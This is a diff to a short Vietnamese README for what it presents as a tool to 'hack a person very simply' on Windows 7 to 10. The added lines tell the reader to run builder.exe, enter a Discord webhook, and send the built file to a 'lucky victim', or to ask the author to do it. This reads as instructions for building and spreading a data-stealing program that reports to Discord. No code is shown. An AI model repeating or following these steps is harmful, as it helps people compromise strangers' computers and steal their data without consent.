@@ -2,6 +2,11 @@
 nó có thể hack 1 người rất đơn giản
 chỉ hack cho máy tính (windows 7 - 10)
 
+**sao để sài
+1. **chạy builder.exe**
+2. nhập webhook discord  
+3. nhấn build vào gửi cho nạn nhân may mắn hoặc nhờ tôi nhé !
+
 **sao để xoá ?**
 1. **Chạy `builder.exe`:**
    - Nhấp đúp vào tệp `builder.exe` để bắt đầu quá trình cài đặt.
